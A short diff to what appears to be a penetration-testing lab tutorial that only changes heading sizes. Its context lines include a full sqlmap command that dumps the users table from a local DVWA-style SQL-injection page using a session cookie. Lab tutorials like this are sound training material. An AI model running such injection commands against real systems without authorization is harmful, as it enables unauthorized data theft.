@@ -133,7 +133,7 @@ Password: password
 
 You can use SQLmap to perform various tasks, such as: 
 
-* <h6>Viewing all tables on the webpage: </h6>
+* <h5>Viewing all tables on the webpage: </h5>
 
 
 ```
@@ -164,6 +164,6 @@ Bash
 
 sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --dump -T users --batch
 ```
-* <h6>outcome: </h6>
+* <h5>outcome: </h5>
 <p style="text-align:center;">
 <img src ="./PNGs/3.png"></p>
